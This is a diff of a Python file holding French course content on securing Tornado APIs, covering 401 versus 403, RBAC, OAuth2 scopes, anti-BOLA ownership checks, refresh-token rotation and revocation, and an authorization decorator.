+                    "réponse `401` assure une conformité stricte avec les RFC 9110 et 6750, permettant aux clients HTTP "
+                    "industriels d'automatiser la détection d'expiration."
                 )
             }
         ],
@@ -223,8 +394,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Prenez un jeton généré par la route `POST /api/auth/token`, modifiez un seul caractère au milieu de la chaîne, puis envoyez-le dans `Authorization: Bearer ...` : observez comment le serveur Tornado détecte l'altération.",
-            "Modifiez `ProfilProtegeHandler` pour renvoyer également dans la réponse JSON l'horodatage d'émission du jeton."
+            "Générez un jeton valide via `POST /api/auth/token`, décodez son segment central avec `base64.urlsafe_b64decode` pour observer vos *claims* en clair, puis altérez un unique caractère du segment central avant de l'envoyer dans `Authorization: Bearer ...` afin de constater le rejet `401 BadSignature` par Tornado.",
+            "Étendez `ProfilProtegeHandler` en utilisant `loads(jeton, max_age=900, return_timestamp=True)` afin d'inclure dans la réponse JSON l'horodatage ISO-8601 exact d'émission du jeton ainsi que le nombre de secondes restantes avant expiration."
         ]
     },
 
@@ -233,59 +404,122 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l3": {
         "context": (
-            "Dans la gestion des APIs (*API Management*) et la sécurité applicative, la confusion entre "
-            "**Authentification (`AuthN`)** et **Autorisation (`AuthZ`)** est à l'origine de la faille n°1 mondiale "
-            "du classement **OWASP API Security Top 10** : les failles d'autorisation (`BOLA` — *Broken Object Level Authorization* "
-            "et `BFLA` — *Broken Function Level Authorization*).\n"
-            "Trop souvent, les développeurs vérifient uniquement que l'utilisateur possède un jeton valide (`AuthN`), "
-            "puis exécutent la requête sans vérifier si cet utilisateur précis a le **droit métier (`AuthZ`)** d'effectuer "
-            "cette action ou de consulter cet enregistrement spécifique. Ce chapitre établit une séparation chirurgicale "
-            "entre l'identité (`401`) et la permission (`403`) à travers les trois piliers de l'autorisation moderne : "
-            "**RBAC**, **Scopes OAuth2** et **Propriété de la ressource (Anti-BOLA)**."
+            "Dans la gouvernance des systèmes distribués (*API Management*), l'amalgame conceptuel et logiciel entre "
+            "l'**Authentification (`AuthN`)** et l'**Autorisation (`AuthZ`)** engendre la vulnérabilité numéro un "
+            "mondiale recensée par le référentiel **OWASP API Security Top 10 (2023)** : les défaillances de contrôle "
+            "d'accès au niveau des objets (**API1:2023 — BOLA**, *Broken Object Level Authorization*) et au niveau des "
+            "fonctions (**API5:2023 — BFLA**, *Broken Function Level Authorization*).\n\n"
+            "Une proportion alarmante d'APIs en production se contente de valider la signature cryptographique du jeton "
+            "`Bearer` à l'entrée du `RequestHandler`, puis exécute aveuglément la requête SQL demandée (`SELECT` ou "
+            "`DELETE WHERE id = ?`) sans jamais confronter l'identité authentifiée à la propriété réelle de "
+            "l'enregistrement ciblé. Il suffit alors à n'importe quel abonné légitime d'incrémenter l'identifiant dans "
+            "l'URL pour exfiltrer l'intégralité de la base client. Ce chapitre instaure une frontière sémantique et "
+            "architecturale étanche entre la preuve d'identité (`401`) et l'évaluation des permissions (`403`) à "
+            "travers une défense en profondeur à trois étages : **RBAC**, **Scopes OAuth2** et **invariant Anti-BOLA**."
         ),
         "deep_sections": [
             {
-                "heading": "1. `AuthN` (Qui êtes-vous ? -> `401`) vs `AuthZ` (Que pouvez-vous faire ? -> `403`)",
+                "heading": "1. Sémantique protocolaire stricte : `AuthN` (`401 Unauthorized`) contre `AuthZ` (`403 Forbidden`)",
                 "body": (
-                    "Pour mémoriser définitivement la différence, prenons l'analogie d'un **ministère ou d'un siège d'entreprise sécurisé** :\n"
-                    "- **L'Authentification (`AuthN`) — Le contrôle d'identité au portique d'entrée** : Vous présentez votre carte nationale "
-                    "d'identité ou votre badge nominatif. L'agent de sécurité vérifie que la carte n'est pas falsifiée et qu'elle n'est pas expirée. "
-                    "Si vous n'avez pas de badge ou qu'il est expiré, l'agent ignore qui vous êtes : c'est le code HTTP **`401 Unauthorized`** "
-                    "(qui signifie en réalité *Unauthenticated* dans la spécification RFC 9110).\n"
-                    "- **L'Autorisation (`AuthZ`) — Les droits d'accès aux portes internes** : Une fois entré dans le bâtiment avec votre badge "
-                    "valide de *Stagiaire*, vous tentez d'ouvrir la porte de la *Salle des Coffres Financiers*. Le lecteur optique reconnaît "
-                    "parfaitement votre identité (`AuthN` réussie !), mais consulte la matrice des permissions et constate que le statut *Stagiaire* "
-                    "n'a pas l'habilitation requise. Se reconnecter avec le même badge ne changera rien : c'est le code HTTP **`403 Forbidden`**.\n"
-                    "- **Règle d'architecture absolue** : L'Autorisation (`AuthZ`) s'exécute **toujours après** l'Authentification (`AuthN`). On ne peut "
-                    "pas évaluer les permissions d'un appelant anonyme non identifié."
+                    "Malgré un accident historique de nommage dans la spécification HTTP/1.0 perpétué pour des raisons "
+                    "de compatibilité ascendante dans la **RFC 9110**, les codes `401` et `403` traduisent deux états "
+                    "automates mutuellement exclusifs que vos `RequestHandlers` Tornado ne doivent jamais intervertir, "
+                    "sous peine de briser les machines à états des applications frontales et mobiles.\n\n"
+                    "#### `401 Unauthorized` : échec d'Authentification (`AuthN` — « Qui êtes-vous ? »)\n\n"
+                    "Le serveur émet `401` exclusivement lorsqu'il est incapable d'établir avec certitude l'identité de "
+                    "l'appelant : l'en-tête `Authorization` est absent, la signature `HMAC` est corrompue ou la fenêtre "
+                    "temporelle `exp` est échue. Sémantiquement, `401` signifie *Unauthenticated* et porte une promesse "
+                    "conditionnelle : si le client renouvelle sa requête en fournissant des informations d'authentification "
+                    "fraîches ou valides (via `/api/auth/refresh` ou une reconnexion), l'opération a une chance d'aboutir.\n\n"
+                    "#### `403 Forbidden` : échec d'Autorisation (`AuthZ` — « Avez-vous cette habilitation ? »)\n\n"
+                    "À l'inverse, le code `403` atteste que l'étape `AuthN` a **pleinement réussi** : Tornado a vérifié "
+                    "la signature du jeton et sait pertinemment que l'appelant est `stagiaire_101`. Cependant, le moteur "
+                    "de politique d'accès refuse à cette identité précise le droit d'invoquer cette méthode ou de toucher "
+                    "cet objet métier. Renvoyer `401` à la place de `403` provoquerait un bogue grave côté client : "
+                    "l'intercepteur HTTP de l'application mobile croirait son jeton expiré, appellerait `/api/auth/refresh` "
+                    "en boucle infinie, ou déconnecterait brutalement un utilisateur pourtant légitimement connecté.\n\n"
+                    "> « The 401 (Unauthorized) status code indicates that the request has not been applied because it "
+                    "lacks valid authentication credentials for the target resource. [...] The 403 (Forbidden) status code "
+                    "indicates that the server understood the request but refuses to authorize it. Re-authenticating will "
+                    "make no difference. » — IETF RFC 9110, Sections 15.5.2 & 15.5.4 (Fielding, Nottingham & Reschke, 2022)"
                 )
             },
             {
-                "heading": "2. Les 3 niveaux d'Autorisation (`AuthZ`) en API Management : RBAC, Scopes OAuth2 et Anti-BOLA",
+                "heading": "2. Défense en profondeur `AuthZ` : la triade RBAC, Scopes OAuth2 et propriété d'objet (Anti-BOLA)",
                 "body": (
-                    "Une architecture d'API professionnelle combine trois niveaux complémentaires de contrôle d'autorisation :\n"
-                    "1. **Niveau 1 — `RBAC` (*Role-Based Access Control* / Contrôle par Rôle)** : L'accès aux fonctionnalités sensibles est "
-                    "conditionné par le rôle global de l'utilisateur (`stagiaire`, `formateur`, `admin`). Exemple : seul le rôle `admin` "
-                    "peut appeler `DELETE /api/formations/<id>`.\n"
-                    "2. **Niveau 2 — `Scopes` OAuth2 (Permissions granulaires déléguées)** : On restreint le jeton à une liste de **Scopes** "
-                    "explicites comme `[\"dossiers:read\"]` sans `\"audit:admin\"`. Même si le propriétaire du compte est `admin`, ce jeton "
-                    "précis se verra opposer un `403 Forbidden` s'il tente une action hors de ses scopes.\n"
-                    "3. **Niveau 3 — Contrôle de propriété de l'objet (`Anti-BOLA` / *Object-Level Authorization*)** : C'est la défense contre la "
-                    "faille **OWASP API1:2023 (BOLA)**. Si le stagiaire `101` appelle `GET /api/dossiers/101`, il reçoit `200 OK`. Mais s'il "
-                    "modifie l'URL en `GET /api/dossiers/102`, le `RequestHandler` doit impérativement vérifier "
-                    "`self.current_user[\"sub\"] == dossier[\"proprietaire\"]` (ou `self.current_user[\"role\"] == \"admin\"`)."
+                    "Dans un système d'information de grade industriel, l'autorisation ne se réduit jamais à un simple "
+                    "booléen `is_admin`. Elle s'articule comme un entonnoir de filtrage progressif où chaque requête "
+                    "authentifiée doit franchir trois barrières orthogonales avant d'atteindre la couche de persistance.\n\n"
+                    "#### Premier étage : contrôle d'accès basé sur les rôles (`RBAC` — *Role-Based Access Control*)\n\n"
+                    "Le modèle `RBAC` gouverne l'accès aux **catégories de fonctionnalités** (*Function-Level Authorization*) "
+                    "en rattachant chaque compte utilisateur à un profil organisationnel (`stagiaire`, `formateur`, "
+                    "`auditeur`, `admin`). Par exemple, seule l'appartenance aux rôles `formateur` ou `admin` autorise "
+                    "l'invocation de `POST /api/v1/formations`, tandis que la purge définitive `DELETE` demeure "
+                    "strictement réservée au rôle `admin`. Ce contrôle neutralise la faille OWASP API5:2023 (`BFLA`).\n\n"
+                    "#### Deuxième étage : restriction de délégation par `Scopes` OAuth2 (RFC 6749)\n\n"
+                    "Un même administrateur peut émettre un jeton dédié à un script d'export nocturne de statistiques. "
+                    "Si ce script se fait compromettre, il serait catastrophique qu'il hérite de la totalité des pouvoirs "
+                    "destructeurs du compte `admin`. Les **`Scopes`** (`[\"formations:read\", \"rapports:export\"]`) "
+                    "appliquent le **principe du moindre privilège au jeton lui-même** : ils définissent le sous-ensemble "
+                    "maximal d'actions que ce porteur spécifique est autorisé à accomplir au nom de l'utilisateur.\n\n"
+                    "#### Troisième étage : contrôle au niveau de l'instance d'objet (`Anti-BOLA` / OWASP API1:2023)\n\n"
+                    "Même lorsque le rôle (`stagiaire`) et le scope (`dossiers:read`) autorisent l'appel de la route "
+                    "générique `GET /api/v1/dossiers/([0-9]+)`, il reste à prouver la relation légitime entre l'appelant "
+                    "et **l'enregistrement précis** désigné par l'identifiant capturé. C'est ici que réside la faille "
+                    "`BOLA` (anciennement nommée `IDOR` — *Insecure Direct Object Reference*) : le `RequestHandler` doit "
+                    "charger les métadonnées de l'objet (ou intégrer `AND proprietaire_id = ?` directement dans la clause "
+                    "`WHERE` SQL) pour vérifier que `self.current_user[\"sub\"] == dossier[\"proprietaire\"]`, sauf "
+                    "dérogation explicite pour un rôle d'encadrement habilité.\n\n"
+                    "> [!WARNING] Discrétion d'énumération : `403 Forbidden` vs `404 Not Found` sur BOLA\n"
+                    "> Sur des ressources hautement confidentielles (dossiers médicaux, enquêtes disciplinaires, comptes "
+                    "privés), renvoyer `403 Forbidden` sur `GET /api/dossiers/9842` révèle à l'attaquant que le dossier "
+                    "`9842` existe bel et bien en base, facilitant le dénombrement. La RFC 9110 (Section 15.5.4) "
+                    "autorise explicitement un serveur qui souhaite dissimuler l'existence même d'une ressource non "
+                    "autorisée à répondre `404 Not Found` lorsque la requête `SELECT ... WHERE id = ? AND proprietaire = ?` "
+                    "ne ramène aucune ligne."
                 )
             },
             {
-                "heading": "3. Implémentation d'un pipeline de sécurité multicouche dans Tornado (`self.current_user`)",
+                "heading": "3. Architecture du contexte d'identité dans Tornado : `get_current_user` et `self.current_user`",
                 "body": (
-                    "Dans Tornado, chaque `RequestHandler` dispose de la propriété native `self.current_user` :\n"
-                    "- **Étape 1 (Décorateur `@exiger_acces` ou `get_current_user(self)`)** : Extrait le jeton `Bearer`, vérifie la signature "
-                    "cryptographique et stocke le Payload vérifié dans `self.current_user`. En cas d'échec, coupe immédiatement le cycle avec `401 Unauthorized`.\n"
-                    "- **Étape 2 (Vérification RBAC & Scopes)** : Vérifie que `self.current_user[\"role\"]` appartient aux rôles autorisés et que le "
-                    "scope requis figure dans `self.current_user[\"scopes\"]`. En cas d'échec, renvoie `403 Forbidden`.\n"
-                    "- **Étape 3 (Vérification métier Anti-BOLA dans `get(self, id)`)** : Compare `self.current_user[\"sub\"]` avec "
-                    "le champ `proprietaire` de l'enregistrement avant de retourner ou modifier la ressource."
+                    "Le cycle de vie interne de `tornado.web.RequestHandler` possède une intégration native de premier "
+                    "ordre pour transporter le contexte de sécurité à travers toutes les étapes d'une requête : la "
+                    "propriété mémoïsée `self.current_user` couplée à la méthode surchargeable `get_current_user(self)`. "
+                    "Lors du premier accès à `self.current_user` (ou lorsque vous l'assignez explicitement dans "
+                    "`prepare(self)` ou un décorateur), Tornado met en cache le dictionnaire d'identité pour toute la "
+                    "durée de vie de l'instance `RequestHandler` — laquelle, rappelons-le, est instanciée fraîchement "
+                    "pour chaque requête HTTP entrante et détruite sitôt `on_finish()` terminé, garantissant une "
+                    "isolation mémoire absolue entre deux requêtes concurrentes sur l'`IOLoop`.\n\n"
+                    "```python — Pipeline multicouche AuthN + RBAC + Scopes + Anti-BOLA dans Tornado\n"
+                    "class DossierStagiaireHandler(BaseAPIHandler):\n"
+                    "    def get(self, dossier_id: str) -> None:\n"
+                    "        identite = self.current_user  # Peuplé et vérifié en amont (AuthN)\n"
+                    "        if identite is None:\n"
+                    "            self.repondre_erreur(401, \"Authentification Bearer requise\")\n"
+                    "            return\n\n"
+                    "        # Niveau 1 & 2 (AuthZ fonctionnelle : RBAC + Scopes OAuth2)\n"
+                    "        if identite.get(\"role\") not in {\"stagiaire\", \"admin\"}:\n"
+                    "            self.repondre_erreur(403, \"Role non habilite pour ce module\")\n"
+                    "            return\n"
+                    "        if \"dossiers:read\" not in identite.get(\"scopes\", []):\n"
+                    "            self.repondre_erreur(403, \"Scope 'dossiers:read' manquant sur ce jeton\")\n"
+                    "            return\n\n"
+                    "        # Niveau 3 (AuthZ sur l'instance d'objet : parade Anti-BOLA)\n"
+                    "        dossier = DEPOT_DOSSIERS.get(int(dossier_id))\n"
+                    "        if not dossier:\n"
+                    "            self.repondre_erreur(404, \"Dossier introuvable\")\n"
+                    "            return\n"
+                    "        est_proprietaire = (dossier[\"proprietaire\"] == identite[\"sub\"])\n"
+                    "        est_admin = (identite[\"role\"] == \"admin\")\n"
+                    "        if not (est_proprietaire or est_admin):\n"
+                    "            self.repondre_erreur(403, \"Acces interdit au dossier d'un tiers (Anti-BOLA)\")\n"
+                    "            return\n\n"
+                    "        self.write({\"statut\": \"ok\", \"dossier\": dossier})\n"
+                    "```\n\n"
+                    "En structurant systématiquement vos gestionnaires autour d'une classe mère `BaseAPIHandler` qui "
+                    "résout `self.current_user` dès `prepare(self)`, vous éliminez le risque d'oublier la validation "
+                    "cryptographique sur un nouvel endpoint et concentrez le code métier de `get()`, `put()` ou `delete()` "
+                    "sur l'expression limpide des invariants d'autorisation et de propriété."
                 )
             }
         ],
@@ -341,8 +575,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script `day_4/04_refresh_token_et_rbac.py` pour observer les 5 scénarios de test couvrant `200`, `401` et `403` (RBAC et Anti-BOLA).",
-            "Écrivez une fonction de contrôle `verifier_acces_document(identite_jeton, document)` qui autorise la lecture si l'utilisateur est propriétaire du document, s'il appartient au même département avec le rôle `manager`, ou s'il est `admin`."
+            "Exécutez le module `day_4/04_refresh_token_et_rbac.py` et tracez les cinq réponses protocolaires couvrant `200 OK`, `401 Unauthorized` et `403 Forbidden` afin de vérifier expérimentalement la frontière entre `AuthN`, `RBAC` et `Anti-BOLA`.",
+            "Implémentez un prédicat d'autorisation métier `autoriser_lecture_note(identite, note)` combinant modèles RBAC et ABAC (*Attribute-Based Access Control*) : l'accès est accordé si l'appelant est l'auteur de la note, s'il possède le rôle `responsable_pedagogique` rattaché au même `departement_id` que la note, ou s'il détient le rôle global `admin`."
         ]
     },
 
@@ -351,46 +585,127 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l4": {
         "context": (
-            "Nous avons vu au chapitre 4.2 qu'un jeton Stateless (`Access Token`) ne peut pas être facilement annulé "
-            "avant sa date d'expiration sans consulter une base de données. Cela pose un dilemme d'architecture :\n"
-            "- Si on fixe la durée de vie de l'`Access Token` à **30 jours**, l'utilisateur reste connecté confortablement, "
-            "mais si son jeton est volé ou si un employé quitte l'entreprise, il conserve un accès complet pendant un mois.\n"
-            "- Si on fixe la durée de vie de l'`Access Token` à **15 minutes**, la sécurité est maximale, mais déconnecter "
-            "l'utilisateur toutes les 15 minutes en lui redemandant son mot de passe détruit l'expérience utilisateur.\n"
-            "L'industrie résout ce paradoxe grâce à l'**architecture à double jeton (`Access Token` court + `Refresh Token` long)** "
-            "couplée à une **liste de révocation (`Token Blacklist`)** et à des **décorateurs de méthodes `RequestHandler` (`@exiger_acces`)**."
+            "L'authentification purement *Stateless* étudiée au chapitre 4.2 révèle un compromis architectural "
+            "fondamental dès qu'elle affronte les exigences opérationnelles d'une grande organisation : l'impossibilité "
+            "de révoquer instantanément un jeton autonome sans réintroduire un état partagé côté serveur. Si l'on "
+            "accorde à un `Access Token` une durée de validité de trente jours pour épargner aux utilisateurs mobiles "
+            "des reconnexions répétées, le vol d'un téléphone ou le départ d'un collaborateur laisse une fenêtre de "
+            "compromission active d'un mois entier. Inversement, abaisser cette validité à dix minutes restaure la "
+            "sécurité mais détruit l'expérience utilisateur si l'application réclame le mot de passe quatre fois par heure.\n\n"
+            "La norme OAuth 2.0 (RFC 6749 / RFC 9700) résout élégamment cette tension en dissociant le **transport "
+            "haute fréquence** du **renouvellement contrôlé** grâce à une architecture asymétrique à deux jetons : "
+            "un `Access Token` éphémère vérifié en mémoire vive pure sur 99 % du trafic, épaulé par un `Refresh Token` "
+            "à longue durée de vie, isolé par domaine cryptographique (`salt`), révocable par identifiant `jti` et "
+            "orchestré dans Tornado par des décorateurs déclaratifs sur les méthodes `RequestHandler`."
         ),
         "deep_sections": [
             {
-                "heading": "1. Le duo `Access Token` (15 min, Stateless) et `Refresh Token` (7 à 30 jours, Révocable)",
+                "heading": "1. Architecture bi-jeton (`Access` court Stateless vs `Refresh` long Stateful) et isolation par `salt`",
                 "body": (
-                    "Lors d'une authentification réussie sur `POST /api/auth/login`, le `LoginHandler` Tornado émet **deux jetons distincts** "
-                    "(signés avec deux sels cryptographiques différents `salt=\"access-token\"` et `salt=\"refresh-token\"`) :\n"
-                    "1. **L'`Access Token` (durée très courte : 5 à 15 minutes)** : C'est le jeton envoyé à chaque requête métier "
-                    "(`GET /api/dossiers/101`). Sa vérification est purement cryptographique (ultra-rapide, en RAM).\n"
-                    "2. **Le `Refresh Token` (durée longue : 7 à 30 jours)** : Ce jeton ne permet d'appeler **aucune route métier**. "
-                    "Son unique utilité est d'être présenté à `POST /api/auth/refresh` lorsque l'`Access Token` vient "
-                    "d'expirer, afin d'obtenir silencieusement un nouvel `Access Token` tout neuf de 15 minutes sans redemander le mot de passe."
+                    "Lorsqu'un client valide ses identifiants primaires sur `POST /api/v1/auth/login`, le gestionnaire "
+                    "`LoginHandler` émet simultanément une paire de jetons aux propriétés temporelles et architecturales "
+                    "strictement complémentaires.\n\n"
+                    "#### L'`Access Token` (5 à 15 minutes) : vitesse maximale sur le chemin critique\n\n"
+                    "Ce jeton accompagne chaque appel aux routes métier (`/api/v1/formations`, `/api/v1/dossiers/101`). "
+                    "Sa validation demeure intégralement *Stateless* (un unique calcul `HMAC-SHA256` en RAM dans le "
+                    "processus Tornado courant). Ainsi, 99 % des requêtes de votre cluster s'exécutent à pleine vitesse "
+                    "sans jamais interroger de base de sessions externe. En cas d'exfiltration accidentelle d'un journal "
+                    "réseau, son utilité pour un attaquant s'éteint d'elle-même au bout de quelques minutes.\n\n"
+                    "#### Le `Refresh Token` (7 à 30 jours) : renouvellement silencieux et séparation de domaine\n\n"
+                    "Conservé dans un coffre sécurisé du terminal (*Keychain* iOS, *Keystore* Android ou cookie `HttpOnly` "
+                    "restreint à `Path=/api/v1/auth/refresh`), le `Refresh Token` n'est **jamais transmis aux routes "
+                    "métier**. Il ne sort sur le réseau qu'une fois toutes les quinze minutes à destination exclusive de "
+                    "`POST /api/v1/auth/refresh`. Pour interdire mathématiquement toute attaque par confusion de type de "
+                    "jeton (*Token Substitution Attack*), les deux jetons doivent impérativement être signés sous deux "
+                    "espaces cryptographiques distincts — soit par deux clés secrètes indépendantes, soit par dérivation "
+                    "de domaine via des paramètres `salt` disjoints (`salt=\"isgp-access-v1\"` contre "
+                    "`salt=\"isgp-refresh-v1\"`). Un `Refresh Token` présenté frauduleusement dans `Authorization: Bearer` "
+                    "sur une route métier échoue alors dès la vérification `HMAC` avec `BadSignature`."
                 )
             },
             {
-                "heading": "2. Révocation immédiate (`Blacklist` / Redis) et Rotation des Refresh Tokens",
+                "heading": "2. Révocation par `jti` dans Redis, rotation atomique et détection de réutilisation",
                 "body": (
-                    "Que se passe-t-il si un utilisateur clique sur « Se déconnecter » ou si l'équipe de sécurité détecte une compromission ?\n"
-                    "- On envoie le `Refresh Token` à `POST /api/auth/revoke` (ou `/logout`). Le serveur ajoute son identifiant unique `jti` "
-                    "à une **liste noire (`REFRESH_TOKENS_REVOQUES`)** stockée en production dans **Redis**.\n"
-                    "- Dès lors, même si la signature cryptographique du `Refresh Token` est encore mathématiquement valide, `RefreshHandler` "
-                    "vérifie s'il figure dans `REFRESH_TOKENS_REVOQUES` et bloque net toute émission de nouvel `Access Token`."
+                    "Parce que le `Refresh Token` n'est sollicité qu'une seule fois par quart d'heure et par utilisateur "
+                    "actif, le serveur Tornado peut s'autoriser sur l'unique endpoint `/api/v1/auth/refresh` une lecture "
+                    "réseau ultra-rapide (moins d'une milliseconde vers un cluster **Redis** via `redis.asyncio`) sans "
+                    "dégrader la scalabilité globale de l'API.\n\n"
+                    "#### Liste de révocation indexée par `jti` (*JWT ID*) avec expiration automatique (`TTL`)\n\n"
+                    "Chaque `Refresh Token` embarque lors de sa création un identifiant universellement unique "
+                    "`jti = secrets.token_hex(16)`. Lorsqu'un utilisateur se déconnecte explicitement (`POST /api/v1/auth/revoke`) "
+                    "ou qu'un administrateur suspend un compte compromis, le serveur inscrit la clé `revoked:jti:<id>` "
+                    "dans Redis en lui associant un délai d'expiration (`EXPIRE` / `TTL`) égal au temps de vie restant du "
+                    "jeton. La mémoire de Redis demeure ainsi naturellement bornée : dès que le jeton aurait de toute "
+                    "façon expiré mathématiquement, Redis purge automatiquement l'entrée de sa table de hachage.\n\n"
+                    "> [!IMPORTANT] Rotation des Refresh Tokens et détection de vol (RFC 9700)\n"
+                    "> Les meilleures pratiques modernes de sécurité OAuth 2.0 (RFC 9700, *OAuth 2.0 Security Best Current "
+                    "Practice*) recommandent la **rotation à usage unique** (*Refresh Token Rotation*) : chaque appel "
+                    "réussi à `/api/v1/auth/refresh` invalide immédiatement le `jti` du `Refresh Token` entrant et émet "
+                    "un couple `{nouvel_access, nouveau_refresh}` rattaché à une même lignée (`family_id`). Si un `jti` "
+                    "déjà consommé est présenté une seconde fois, le serveur a la preuve formelle qu'un doublon du jeton "
+                    "a été dérobé et utilisé en parallèle : il révoque alors instantanément toute la lignée `family_id`, "
+                    "éjectant simultanément le pirate et forçant une ré-authentification saine de l'utilisateur légitime."
                 )
             },
             {
-                "heading": "3. Factoriser la sécurité avec une usine à décorateurs Python (`@exiger_acces`) sur `RequestHandler`",
+                "heading": "3. Ingénierie d'une fabrique de décorateurs compatibles `async def` (`@exiger_acces`) pour Tornado",
                 "body": (
-                    "Copier-coller 25 lignes de lecture d'en-tête `Authorization`, de `try / except SignatureExpired` et de vérification de rôle "
-                    "au début de chacune des 80 méthodes `get()`/`post()` d'une API viole le principe **DRY (*Don't Repeat Yourself*)**.\n"
-                    "- En Python, un **décorateur paramétré** `@exiger_acces(roles_autorises=(\"admin\",), scope_requis=\"audit:admin\")` "
-                    "enveloppe la méthode `def delete(self, *args, **kwargs):` du `RequestHandler`.\n"
-                    "- Si le jeton est valide et autorisé, le décorateur peuple `self.current_user = payload` et appelle la méthode cible."
+                    "Répéter manuellement l'extraction de l'en-tête `Authorization`, le décodage cryptographique et les "
+                    "assertions de rôles ou de scopes en tête de cent méthodes `get()`, `post()`, `put()` et `delete()` "
+                    "dégrade la lisibilité du code et garantit tôt ou tard un oubli humain lors d'une maintenance urgente. "
+                    "En Python, une **usine à décorateurs paramétrée** permet d'exprimer la politique de sécurité de "
+                    "manière déclarative directement au-dessus de chaque verbe HTTP du `RequestHandler`.\n\n"
+                    "#### Compatibilité transparente avec les coroutines `async def` de Tornado\n\n"
+                    "Une subtilité technique majeure distingue Tornado des frameworks synchrones : les méthodes d'un "
+                    "`RequestHandler` peuvent être définies aussi bien de façon synchrone (`def get(self):`) que sous "
+                    "forme de coroutines natives (`async def get(self):`) lorsqu'elles exécutent des appels `await`. "
+                    "Si un décorateur enveloppe une coroutine sans propager `await` (ou si la fonction enveloppe est "
+                    "`async def` et supporte `inspect.iscoroutinefunction`), Tornado doit pouvoir attendre la complétion "
+                    "de la coroutine avant d'invoquer `self.finish()`. Définir l'enveloppe interne en `async def` et "
+                    "inspecter le résultat avec `inspect.isawaitable()` garantit un fonctionnement universel sur tous les "
+                    "gestionnaires Tornado.\n\n"
+                    "```python — Usine à décorateurs asynchrone @exiger_acces pour RequestHandler Tornado\n"
+                    "from functools import wraps\n"
+                    "import inspect\n"
+                    "from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadSignature\n\n"
+                    "def exiger_acces(roles_autorises: tuple[str, ...] = (), scope_requis: str | None = None):\n"
+                    "    def decorateur(methode_http):\n"
+                    "        @wraps(methode_http)\n"
+                    "        async def enveloppe(self, *args, **kwargs):\n"
+                    "            schema, _, jeton = self.request.headers.get(\"Authorization\", \"\").partition(\" \")\n"
+                    "            if schema.lower() != \"bearer\" or not jeton:\n"
+                    "                self.set_status(401)\n"
+                    "                self.finish({\"erreur\": \"Authentification Bearer requise\"})\n"
+                    "                return\n"
+                    "            srv = URLSafeTimedSerializer(self.settings[\"jwt_secret\"], salt=\"access-token\")\n"
+                    "            try:\n"
+                    "                payload = srv.loads(jeton.strip(), max_age=900)\n"
+                    "            except SignatureExpired:\n"
+                    "                self.set_status(401)\n"
+                    "                self.finish({\"erreur\": \"Access token expire — appelez /api/auth/refresh\"})\n"
+                    "                return\n"
+                    "            except BadSignature:\n"
+                    "                self.set_status(401)\n"
+                    "                self.finish({\"erreur\": \"Signature du jeton invalide\"})\n"
+                    "                return\n"
+                    "            if roles_autorises and payload.get(\"role\") not in roles_autorises:\n"
+                    "                self.set_status(403)\n"
+                    "                self.finish({\"erreur\": \"Role insuffisant pour cette ressource\"})\n"
+                    "                return\n"
+                    "            if scope_requis and scope_requis not in payload.get(\"scopes\", []):\n"
+                    "                self.set_status(403)\n"
+                    "                self.finish({\"erreur\": f\"Scope requis manquant : {scope_requis}\"})\n"
+                    "                return\n"
+                    "            self.current_user = payload\n"
+                    "            resultat = methode_http(self, *args, **kwargs)\n"
+                    "            if inspect.isawaitable(resultat):\n"
+                    "                await resultat\n"
+                    "        return enveloppe\n"
+                    "    return decorateur\n"
+                    "```\n\n"
+                    "Grâce à `@wraps(methode_http)` du module standard `functools`, l'enveloppe préserve fidèlement "
+                    "`__name__`, `__doc__` et `__wrapped__`, ce qui permet aux générateurs d'introspection OpenAPI et aux "
+                    "traceurs de performance de continuer à identifier précisément chaque méthode décorée."
                 )
             }
         ],
@@ -434,8 +749,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Implémentez la **rotation complète du Refresh Token** dans `RefreshHandler.post` : chaque fois qu'un `Refresh Token` est utilisé pour obtenir un nouvel `Access Token`, ajoutez immédiatement l'ancien `jti` dans `REFRESH_TOKENS_REVOQUES` et renvoyez à la fois un nouvel `Access Token` et un nouveau `Refresh Token`.",
-            "Enrichissez le décorateur `@exiger_acces` pour qu'il injecte automatiquement le dictionnaire décodé dans `self.current_user`."
+            "Implémentez dans `RefreshHandler.post` la **rotation stricte à usage unique** accompagnée d'une détection de compromission : associez un `family_id` lors du login initial, inscrivez chaque `jti` utilisé dans un dictionnaire `JTI_CONSOMMES`, et si un `jti` déjà consommé est rejoué, invalidez immédiatement l'intégralité du `family_id`.",
+            "Vérifiez que votre décorateur `@exiger_acces` fonctionne de manière transparente à la fois sur une méthode synchrone `def get(self)` et sur une coroutine `async def post(self)` effectuant un `await asyncio.sleep(0.01)`."
         ]
     },
 
@@ -444,48 +759,105 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l5": {
         "context": (
-            "Même une API parfaitement authentifiée reste vulnérable sur le plan de sa **disponibilité** et de ses **coûts financiers** :\n"
-            "- Un attaquant peut lancer une attaque par force brute sur `POST /api/auth/login` en testant 10 000 mots de passe par minute.\n"
-            "- Un développeur partenaire peut commettre une erreur de programmation (`while True:` sans pause) et bombarder votre serveur "
-            "de 5 000 requêtes par seconde, saturant l'`IOLoop` et la base de données pour tous les autres clients légitimes (**Déni de Service — DoS**).\n"
-            "La **limitation de débit (`Rate Limiting`)** dans la méthode `prepare(self)` d'un `RequestHandler` Tornado impose un quota "
-            "maximal de requêtes par fenêtre de temps et répond avec le code standard **`429 Too Many Requests`**."
+            "L'authentification et l'autorisation protègent la confidentialité et l'intégrité des données, mais elles ne "
+            "protègent nullement la **disponibilité opérationnelle** du serveur ni la maîtrise de ses coûts d'infrastructure. "
+            "Sur Internet, deux menaces volumétriques pèsent en permanence sur une boucle événementielle Tornado : "
+            "les attaques automatisées par dictionnaire ou bourrage d'identifiants (*Credential Stuffing*) visant "
+            "`POST /api/v1/auth/login`, et le phénomène du « voisin bruyant » (*Noisy Neighbor*), lorsqu'un script "
+            "partenaire pourtant dûment authentifié entre accidentellement dans une boucle `while True:` sans temporisation "
+            "et inonde le serveur de milliers de requêtes par seconde.\n\n"
+            "Sans régulation du flux en amont, un unique consommateur défaillant monopolise le temps CPU de sérialisation "
+            "JSON, épuise le pool de connexions PostgreSQL et allonge la latence de l'`IOLoop` pour l'ensemble des "
